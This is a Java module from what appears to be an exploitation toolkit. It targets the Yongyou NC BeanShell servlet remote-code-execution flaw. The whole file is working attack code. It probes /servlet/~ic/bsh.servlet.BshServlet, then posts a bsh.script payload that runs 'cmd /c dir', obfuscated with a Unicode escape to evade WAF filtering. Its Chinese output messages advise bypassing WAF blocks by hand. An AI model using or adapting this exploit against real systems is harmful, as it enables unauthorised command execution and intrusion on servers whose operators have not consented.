package Exp.OA.yongyou;

import Utilss.HttpTools;
import Utilss.Response;
import core.Exploitlnterface;
import javafx.scene.control.TextArea;

import java.util.HashMap;

public class yongyou_nc_BshServlet implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url,textArea);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        textArea.appendText("\n 该漏洞已直接执行系统命令，无需getshell");
        return false;
    }

    private Boolean att(String url,TextArea textArea){
        Response response = HttpTools.get(url + "/servlet/~ic/bsh.servlet.BshServlet", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains("BeanShell Test Servlet")){
            textArea.appendText("\n 漏洞存在 开始测试payload");

            Response post = HttpTools.post(url + "/servlet/~ic/bsh.servlet.BshServlet", "bsh.script=ex%5Cu0065c%28%22cmd+%2Fc+dir%22%29%3B"
                    , new HashMap<String, String>(),"utf-8");
            if(post.getCode() == 200 && post.getText().contains("BeanShell Test Servlet")){
                textArea.appendText("\n ex\\u0065c(\"cmd /c dir\"); 可用");
                textArea.appendText("\n " + url + "/servlet/~ic/bsh.servlet.BshServlet");
                return true;
            }else {
                textArea.appendText("\n 漏洞存在 命令被waf拦截 请尝试手动绕过");
                return true;
            }

        }else {
            textArea.appendText("\n e-cology BshServlet-RCE-漏洞不存在 (出现误报请联系作者)");
            return false;
        }
    }
}
